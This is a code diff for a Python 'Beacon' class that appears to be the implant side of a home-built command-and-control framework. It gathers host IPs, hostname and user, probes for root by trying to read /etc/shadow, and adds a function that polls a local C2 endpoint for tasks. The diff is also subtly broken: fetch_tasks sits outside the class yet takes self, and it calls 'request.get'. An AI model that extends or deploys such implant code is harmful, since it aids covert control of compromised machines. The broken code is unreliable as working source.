@@ -12,9 +12,32 @@ class Beacon():
         self.remote_hostname = self.get_hostname()
         self.remote_permissions = self.get_permissions()
         self.beacon_write_path = agent.get_beacon_path()
+        self.beacon_id = None
 
-        if not os.path.exists(self.beacon_write_path):
-            os.makedirs(self.beacon_write_path)
+    def get_ip(self):
+        ip_addresses = []
+        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
+        ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
+        ip_addresses = ip_pattern.findall(result.stdout)
+        return ip_addresses
+    
+    def get_hostname(self):
+        return socket.gethostname()
+    
+    def get_permissions(self):
+        root = False
+        name_result = subprocess.run(['whoami'], capture_output= True, text=True, check=True)
+        name = name_result.stdout.strip()
+        if "root" in name :
+            root = True 
+        else:
+            check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output= True, text=True, check=True)
+            if "Permission denied" in check_for_root.stderr:
+                pass
+            else:
+                root = True          
+        return name, root
+
              
     def write_new_beacon(self):
         write_path = self.beacon_write_path
@@ -48,27 +71,18 @@ class Beacon():
         return (compromised_hostname, compromised_ip, compromised_permissions)
         
 
-    def get_hostname(self):
-        return socket.gethostname()
+def fetch_tasks(self):
+    if not self.beacon_id:
+        print("Beacon is not registered!")
+        return
     
-    def get_ip(self):
-        ip_addresses = []
-        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
-        ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
-        ip_addresses = ip_pattern.findall(result.stdout)
-        return ip_addresses
+    r = request.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")
 
-    def get_permissions(self):
-            root = False
-            name_result = subprocess.run(['whoami'], capture_output= True, text=True, check=True)
-            name = name_result.stdout.strip()
-            if "root" in name :
-                root = True 
-            else:
-                check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output= True, text=True, check=True)
-                if "Permission denied" in check_for_root.stderr:
-                    pass
-                else:
-                    root = True          
-            return name, root
-  
+    if r.status_code == 200:
+        tasks = r.json().get('tasks')
+        if tasks:
+            print(f"Tasks for beacon {self.beacon_id}: {tasks}")
+        else:
+            print("No tasks assigned yet")
+    else:
+        print(f"Error fetching tasks: {r.status_code}")
